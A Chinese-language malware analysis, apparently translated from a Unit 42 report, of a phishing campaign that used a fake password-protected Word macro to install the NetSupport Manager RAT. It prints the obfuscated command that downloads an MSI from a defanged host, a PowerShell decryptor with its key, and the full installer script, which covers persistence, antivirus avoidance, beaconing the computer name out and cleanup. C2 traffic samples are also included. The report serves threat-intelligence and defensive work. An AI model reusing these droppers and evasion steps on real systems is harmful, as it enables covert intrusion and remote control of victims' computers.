**2020年1月安全人员发现了一个伪造为受密码保护的恶意Microsoft
Word文档，该文档在网络钓鱼活动中用于传播商业化远程访问工具（[NetSupport
Manager](https://www.netsupportmanager.com/index.asp)），此RAT通常用于管理员远程访问客户端计算机。但是攻击者将此RAT安装到受害者的系统上，从而获得访问权限。攻击活动中使用多种技术来规避动态和静态分析，并利用PowerShell
PowerSploit来执行恶意文件安装。至少从2018年起NetSupport Manager RAT就已经出现在网络钓鱼活动中。**

##  传播方式

2020年1月上旬检测到一个执行批处理文件的可疑winword.exe进程。 在图1中可以看到多个检测点，从启动Microsoft
Word开始，再到创建和执行.bat文件。 在图2中可以看到“时间轴”，其中显示了检测警报，行为流程和连接尝试。
图3显示了基于这些行为指标检测到的初始警报。

![](https://image.3001.net/images/20200302/1583113807_5e5c664fdcef0.png!small)![](https://image.3001.net/images/20200302/1583113822_5e5c665ea6cc6.png!small)下面图4是恶意文档截图，伪装成受密码保护的NortonLifelock文档，该文档请求用户输入密码以启用宏。用于此分析的文

> SHA256:e9440a5d2de2453ae5b69a9c096f8d4cf9e059469c5de67380d76e02dd6975

![](https://image.3001.net/images/20200302/1583113976_5e5c66f8a9565.png!small)对用户来说，文档似乎包含需要密码才能查看的个人信息。打开文档并单击“启用内容”后，将执行宏并向用户显示密码对话框。  
![](https://image.3001.net/images/20200302/1583114970_5e5c6ada730d7.png!small)密码很有可能被攻击者写在钓鱼邮件正文中，它只接受字母“c”或“C”，如下面的宏代码所示。此宏代码的哈希

> SHA256:68ca2458e0db9739258ce9e22aadd2423002b2cc779033d78d6abec1db534ac2

![](https://image.3001.net/images/20200302/1583140122_5e5ccd1af2244.png!small)

如果用户输入了不正确的密码，则会显示一条错误消息，然后显示“完成”处理消息。在输入正确的密钥之前，不会进行恶意活动，输入正确的密码后，宏将继续执行代码并生成以下命令字符串：

    
    
    cmD /c EChO|SE^t /p=" M^siexe">%temp%\alpaca.bat&EcHo|s^et 
    /p="c " >>%temp%\alpaca.bat&EcHo|s^et /p="^/i" 
    >>%temp%\alpaca.bat&EcHo|s^et /p=" 
    http^:^/^/^quickwaysignstx[.]com/view.php 
    ">>%temp%\alpaca.bat&EcHo|s^et /p=" ^/q 
    &exit">>%temp%\alpaca.bat&%temp%\alpaca.bat&avvfge 2

宏使用visualbasicforapplications（VBA）窗体上的多个标签对字符串进行模糊处理，字符最终连接在一起以构造最终命令，在受害者机器中下载并执行RAT。

命令字符串通过VBA shell函数执行，该函数执行以下操作：

> 1、通过/c参数启动cmd.exe，执行命令并退出
>
> 2、在受害者%temp%目录中构造名为alpaca.bat的批处理文件
>
> 3、执行新创建的批处理脚本

批处理脚本使用msiexec，它是Windows安装程序服务的一部分，用于下载二进制文件并安装：

> quickwaysignstx[.]com/view.php

![](https://image.3001.net/images/20200302/1583140483_5e5cce83aba17.png!small)

如果请求中用户代理字符串是Windows
Installer，则返回MSI文件。MSI负载（SHA256:41d27d53c5d41003bc9913476a3afd3961b561b1201bee8bfde327a5f0d22a040a）是来自[www.exemsi](http://www.exemsi/)[.]com的未注册版本生成的，标题为MPZMZQYVXO
patch version
5.1。此版本字符串是随机的，运行MSI时将显示字符串。下载后，MSI将使用/q参数执行。MSI在受害者的%temp%目录安装PowerShell脚本REgistryMPZMZQYVXO.ps1。

    
    
    function HYTNKJSDEH([String] $YTVRJKIEIR, [String] $BORBFDSYOP)
    {
    $DHPFYCOKLM = “<<strong>base64 encoded + encrypted payload</strong>>”;
    $encoding = New-Object System.Text.ASCIIEncoding;
    $KULVWNXDPId = $encoding.GetBytes("DJZGVUGVHDMNIGZD");
    $derivedPass = New-Object 
    System.Security.Cryptography.PasswordDeriveBytes($YTVRJKIEIR, 
    $encoding.GetBytes($BORBFDSYOP), "SHA1", 2);
    [Byte[]] $ESFLDIMUEO = $derivedPass.GetBytes(16);
    $LCZJFEXHXR = New-Object 
    System.Security.Cryptography.TripleDESCryptoServiceProvider;
    
    $LCZJFEXHXR.Mode = 
    [System.Security.Cryptography.CipherMode]::CBC;
    $JOVGMJCIKY = $LCZJFEXHXR.CreateDecryptor($ESFLDIMUEO, $KULVWNXDPId);
    $LBUWDFHHMZ = New-Object System.IO.MemoryStream($DHPFYCOKLMa, 
    $True);
    $ZSKXKODPKK = New-Object 
    System.Security.Cryptography.CryptoStream($LBUWDFHHMZ, 
    $JOVGMJCIKY, 
    [System.Security.Cryptography.CryptoStreamMode]::Read);
    $STDVLFIUQN = $ZSKXKODPKK.Read($JHTZWEZBUW, 0, 
    $JHTZWEZBUW.Length);
    $LBUWDFHHMZ.Close();
    $ZSKXKODPKK.Close();
    $LCZJFEXHXR.Clear();
    if (($JHTZWEZBUW.Length -gt 3) -and ($JHTZWEZBUW[0] -eq 0xEF) 
    -and ($JHTZWEZBUW[1] -eq 0xBB) -and ($JHTZWEZBUW[2] -eq 0xBF)) { 
    $h = $JHTZWEZBUW[3..($JHTZWEZBUW.Length-1)]; }
    return $encoding.GetString($JHTZWEZBUW).TrimEnd([Char] 0);
    }
     $TYCNJNUWWG = HYTNKJSDEH "ew9p5rzlmvcf32b6i0oun8q47tag1xhs" 
    "7ohp9z481qem6ykbdu2argt5lj3fcsi0";
    Invoke-Expression $TYCNJNUWWG;

存储在REgistryMPZMZQYVXO.ps1中的加密数据blob是另一个PowerShell脚本，负责将NetSupport Manager
RAT安装到受害者上。

PowerShell脚本是使用powerspoit框架中的开源脚本Out-EncryptedScript.ps1生成的。它包含base64数据处理模块，并使用CBC的密码模式进行TripleDES 。

此示例的解密密码和初始化向量（IV）为：

> Decryption key = 0xA7A15B277A74CD3233B9DF078ABCDE12
>
> IV = DJZGVUGVHDMNIGZD
    
    
    $scriptPath = split-path -parent 
    $MyInvocation.MyCommand.Definition
    if ($scriptpath -match "avast") {exit}
    if ($scriptpath -match "Avast") {exit}
    if ($scriptpath -match "AVG") {exit}
    if ($scriptpath -match "avg") {exit}
    function react (
      $source,
      $destination
    )
    {
    Convert-StringToBinary -InputString $source -FilePath $Destination;
      #      }
         }#}
    function Convert-StringToBinary
    (
     $InputString
    ,  $FilePath
    )
    {
    $file= $InputString
    $data = [System.Convert]::FromBase64String($file)
    $ms = New-Object System.IO.MemoryStream
    $ms.Write($data, 0, $data.Length)
    $ms.Seek(0,0) | Out-Null
    
    $cs = New-Object System.IO.Compression.GZipStream($ms, 
    [System.IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object System.IO.StreamReader($cs)
    $t = $sr.readtoend()#|out-file str.txt
    
    $ByteArray = [System.Convert]::FromBase64String($t);
    [System.IO.File]::WriteAllBytes($FilePath, $ByteArray);
    }
    function Install
    {
    $file1 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file2 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file3 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file4 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file5 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file6 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file7 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file8 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file9 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file10 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file11 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    $file12 = “<<strong>Gzip compressed + base64 encoded file</strong>>”;
    
    $randf=( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | 
    Get-Random -Count 8 | % {[char]$_}) )
    $fpath ="$env:appdata\$randf"
    mkdir $fpath
    $clientname="presentationhost.exe"
    $Source = $file1
    $Destination = "$fpath\"+"$clientname"
    react -source $source -destination $destination
    $Source = $file2
    $Destination = "$fpath\client32.ini"
    write-host $destination
    react -source $source -destination $destination
    $Source = $file3
    $Destination = "$fpath\HTCTL32.DLL"
    react -source $source -destination $destination
    $Source = $file4
    $Destination = "$fpath\msvcr100.dll"
    react -source $source -destination $destination
    $Source = $file5
    $Destination = "$fpath\nskbfltr.inf"
    react -source $source -destination $destination
    $Source = $file6
    $Destination = "$fpath\NSM.ini"
    react -source $source -destination $destination
    $Source = $file7
    $Destination = "$fpath\NSM.lic"
    react -source $source -destination $destination
    $Source = $file8
    $Destination = "$fpath\pcicapi.dll"
    react -source $source -destination $destination
    $Source = $file9
    $Destination = "$fpath\PCICHEK.DLL"
    react -source $source -destination $destination
    $Source = $file10
    $Destination = "$fpath\PCICL32.DLL"
    react -source $source -destination $destination
    $Source = $file11
    $Destination = "$fpath\remcmdstub.exe"
    react -source $source -destination $destination
    $Source = $file12
    $Destination = "$fpath\TCCTL32.DLL"
    react -source $source -destination $destination
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ServiceDLL /t REG_SZ /d "$fpath\$clientname" /f
    start-process "$fpath\$clientname"
    #Start-sleep -s 10
    Invoke-WebRequest -Uri "http://afsasdfa33[.]xyz/iplog/lepo.php?hst=$env:computername"
    $f=get-content $env:temp\insghha4.txt
    
    remove-item $env:TEMP\*.ps1
    #cmd /c del %temp%\*.ps1 /f
    #cmd /c del %temp%\*.txt /f
    remove-item $f
    }
    #ShowConsole
    #rights
    
    install;

RAT安装脚本会进行以下操作：

> 1、如果目标上正在运行Avast或AVG防病毒软件，则停止安装
>
> 2、将组成NetSupport Manager
> RAT的12个文件安装到受害者%appdata%中的随机目录（长度为8），例如c:users\username%AppdataRoaming\%randomvalue%
>
>
> 3、在受害者上创建以下注册表项：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
>
> Name: ServiceDLL
>
> Value: C:\Users\%username%
> \AppData\Roaming\%randomvalue%\presentationhost.exe’
>
> 4、执行主NetSupport Manager RAT presentationhost.exe
>
> 5、休眠10秒
>
>
> 6、将受害者的计算机名发送到[http://afsasdfa33](http://afsasdfa33/)[.]xyz/iplog/lepo.php?hst=%computername%
>
> 7、从站点afsasdfa33.]xyz返回的任何数据都保存在%temp%目录中的insghha4.txt
>
> 8、从受害者的%temp%目录中删除所有扩展名为.ps1的文件
>
> 9、删除名为insghha4.txt的文件

NetSupport
Manager（presentationhost.exe）启动后将向域geo.netsupportsoftware[.]com查询主机的地理位置，NetSupport
Manager的原始名称是client32.exe，更改为presentationhost.exe以避免受害者怀疑。流量示例如下：

> POST [http://94.158.245](http://94.158.0.245/)[.]182/fakeurl.htm HTTP/1.1
>
> User-Agent: NetSupport Manager/1.3
>
> Content-Type: application/x-www-form-urlencoded
>
> Content-Length: 22
>
> Host: 94.158.245[.]182
>
> Connection: Keep-Alive
>
> CMD=POLL
>
> INFO=1
>
> ACK=1

响应:

> HTTP/1.1 200 OK
>
> Server: NetSupport Gateway/1.6 (Windows NT)
>
> Content-Type: application/x-www-form-urlencoded
>
> Content-Length: 60
>
> Connection: Keep-Alive
>
> CMD=ENCD
>
> ES=1
>
> DATA=.g+$.{.. \….W…bb…).w}..o..X..xf…

受害目标发送的加密数据：

> POST [http://94.158.245](http://94.158.0.245/)[.]182/fakeurl.htm HTTP/1.1
>
> User-Agent: NetSupport Manager/1.3
>
> Content-Type: application/x-www-form-urlencoded
>
> Content-Length: 244
>
> Host: 94.158.245[.]182
>
> Connection: Keep-Alive
>
> CMD=ENCD
>
> ES=1
>
> DATA=u.2h.r..4.]..%y-…..=I…D3.W..i.7?….=@….F.f….&t.[..6ra..L..Tzg.....
> ..U.z4.]..%y-A9H=n
> .:!."Pfd]U,[.(...f=I.....W.p..RHz.....#..@.....>|.?...R...s.nt.G..=}\\......M...6...wC.........I=M..0i=@..o.ckp=@.r……..M.6..

##  总结

攻击活动是从2019年11月初到2020年1月底。整个11月上半月，所有相关活动都使用的电子邮件附件，其中包含与目标公司有公开联系的个人或公众人物。所有电子邮件使用随机的protonmail[.]com电子邮件地址发送，包含与退款状态或未经授权交易相关的邮件主题。从11月底到2020年1月邮件附件发生了变化，名为<target
company website>.doc，电子邮件主题相同，目前尚不清楚攻击的目的意图。

***参考来源：[unit42](https://unit42.paloaltonetworks.com/cortex-xdr-detects-netsupport-manager-rat-campaign/)，由Kriston编译，转载请注明来自FreeBuf.COM**

  

